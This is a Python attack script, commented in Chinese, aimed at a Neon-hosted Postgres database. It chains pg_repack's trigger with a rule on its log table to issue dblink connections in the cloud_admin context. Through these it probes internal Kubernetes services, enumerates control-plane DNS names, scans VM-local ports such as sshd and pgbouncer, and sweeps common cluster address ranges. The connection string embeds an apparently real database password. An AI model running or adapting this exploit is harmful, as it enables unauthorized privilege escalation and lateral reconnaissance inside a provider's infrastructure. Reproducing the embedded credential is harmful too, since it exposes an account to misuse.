# -*- coding: utf-8 -*-
"""v16:cloud_admin dblink 横向探测——K8s 内网服务指纹 + VM 内端口 + DNS 枚举
纯连接探测(3s 超时),错误指纹区分: DNS失败/超时(不可达)/拒绝/协议错误(服务活着)
零破坏:无任何数据修改"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:500]

q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False)
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

def probe(target, label, timeout=3):
    """dblink_connect 到 target(在 cloud_admin 上下文)——错误指纹分类"""
    set_rule("INSERT INTO k_out(x) SELECT dblink_connect('host=%s port=%s user=cloud_admin password=x dbname=postgres connect_timeout=%d')::text" % (target[0], target[1], timeout))
    r = fire()
    rows = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    if rows:
        print('  [%s] CONNECTED: %s' % (label, rows[0][0]))
        q("SELECT dblink_disconnect('k4')", fetch=False)
        return 'OPEN'
    # 从 fire 错误分类
    err = str(r)[:250] if isinstance(r, str) else str(r)
    cls = 'TIMEOUT/UNREACH' if any(k in err for k in ('timeout', 'timed out', 'could not connect')) else \
          'REFUSED' if any(k in err for k in ('refused', 'Connection')) else \
          'DNS-FAIL' if any(k in err for k in ('could not translate', 'not known', 'Name or service')) else \
          'PROTO/OTHER'
    print('  [%s] %s: %s' % (label, cls, err[:180]))
    return cls

# ============ [1] K8s 内网已知服务(compute_ctl cmdline 泄露) ============
print('=== [1] K8s 内网服务 ===')
probe(('neon-control-plane-api.neon-control-plane.svc.cluster.local', 9096), 'control-plane-api:9096 (gRPC)')
probe(('pg-ext-s3-gateway.pg-ext-s3-gateway.svc.cluster.local', 80), 'pg-ext-s3-gateway:80')
probe(('pg-ext-s3-gateway.pg-ext-s3-gateway.svc.cluster.local', 443), 'pg-ext-s3-gateway:443')

# ============ [2] DNS 枚举常见 Neon 服务 ============
print('=== [2] DNS 枚举 .svc.cluster.local ===')
for host in ('safekeeper', 'pageserver', 'storage-broker', 'neonauth', 'console', 'pgbouncer', 'local-proxy', 'proxy', 'compute', 'broker', 'neon-control-plane', 'pg-ext-s3-gateway'):
    probe(('%s.neon-control-plane.svc.cluster.local' % host, 9096), 'DNS %s.neon-control-plane' % host)
for host in ('pg-ext-s3-gateway',):
    pass

# ============ [3] VM 内服务端口(非 PG 协议指纹) ============
print('=== [3] VM 内端口 ===')
probe(('127.0.0.1', 10432), 'local_proxy HTTP :10432')
probe(('127.0.0.1', 9399), 'sql_exporter :9399')
probe(('127.0.0.1', 25183), 'neonvmd :25183')
probe(('127.0.0.1', 22), 'sshd :22')
probe(('127.0.0.1', 4432), 'local_proxy PG :4432')
probe(('127.0.0.1', 6432), 'pgbouncer :6432')

# ============ [4] 网关/其他网段探测(经默认路由) ============
print('=== [4] 网段可达性(常见 K8s CIDR) ===')
for ip in ('10.0.0.1', '10.96.0.1', '10.96.0.10', '172.20.0.1', '192.168.0.1'):
    probe((ip, 5432), 'probe %s:5432' % ip)

# 清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
q("DROP EXTENSION IF EXISTS dblink", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
